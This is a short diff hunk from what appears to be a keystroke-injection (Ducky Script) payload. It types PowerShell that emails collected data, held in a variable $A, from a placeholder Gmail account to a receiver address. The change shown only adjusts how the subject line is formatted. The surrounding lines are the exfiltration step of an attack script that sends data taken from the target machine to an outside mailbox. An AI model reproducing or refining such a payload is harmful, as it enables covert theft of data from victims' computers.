@@ -31,7 +31,7 @@ STRING $ReportEmail.From = 'ACCOUNT@gmail.com'
 ENTER
 STRING $ReportEmail.To.Add('RECEIVER@gmail.com')
 ENTER
-STRING $ReportEmail.Subject = ( $sub | out-string)
+STRING $ReportEmail.Subject = $sub
 ENTER
 STRING $ReportEmail.Body = ( $A | out-string)
 ENTER
